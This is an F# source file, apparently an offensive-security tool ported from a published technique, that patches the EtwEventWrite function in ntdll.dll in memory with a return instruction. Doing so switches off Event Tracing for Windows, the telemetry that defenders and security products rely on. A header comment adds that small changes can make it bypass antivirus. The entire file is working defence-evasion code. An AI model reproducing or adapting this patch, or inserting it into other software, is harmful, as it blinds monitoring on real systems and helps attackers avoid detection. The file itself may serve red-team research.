//  Ported from: https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/
//  Written by: @JoeLeonJr from @FortyNorthSec 
//  for x33fcon
//  Note: the C# version of this gets picked up, so this one does as well. Small modifications can be made to bypass A/V.
  
open System
open System.Reflection
open System.Runtime.InteropServices

module Win32 =
    [<DllImport "kernel32" >]
    extern nativeint GetProcAddress(
      nativeint         hModule,
      string            procName)

    [<DllImport "kernel32" >]
    extern nativeint LoadLibrary(
        string         name)

    [<DllImport "kernel32" >]
    extern bool VirtualProtect(
          nativeint         lpAddress,
          uint32            dwsize, 
          uint32            flNewProtect, 
          uint32&         lpflOldProtect)

type Bypass() =
  class

    let etwx86 : byte[] = [|0xc2uy;0x14uy;0x00uy;|]
    let etwx64 : byte[] = [|0xc3uy;|]

    member this.is64Bits : bool = 
        let is64Bit : bool = true
        let size = Marshal.SizeOf((nativeint)0)
        if (size = 4) then is64Bit = false
        else is64Bit = true

    member this.Patch(patch : byte[], dll : string, func : string) =

         try
           let lib = Win32.LoadLibrary(dll)
           let addr : nativeint = Win32.GetProcAddress(lib, func)

           let mutable oldProtect : uint32 = Unchecked.defaultof<uint32>
           let vp = Win32.VirtualProtect(addr, (uint32)patch.Length, (uint32)0x40, &oldProtect)

           Marshal.Copy(patch, (int)0, addr, (int)patch.Length)

         with
           ex -> printfn "Error: %s" (ex.ToString())

    member this.BypassEtw = 
        if this.is64Bits then this.Patch(etwx64, "ntdll.dll", "EtwEventWrite")
        else this.Patch(etwx86, "ntdll.dll", "EtwEventWrite")
        
  end

[<EntryPoint>]
let main argv =
    let b = new Bypass()
    b.BypassEtw
    0 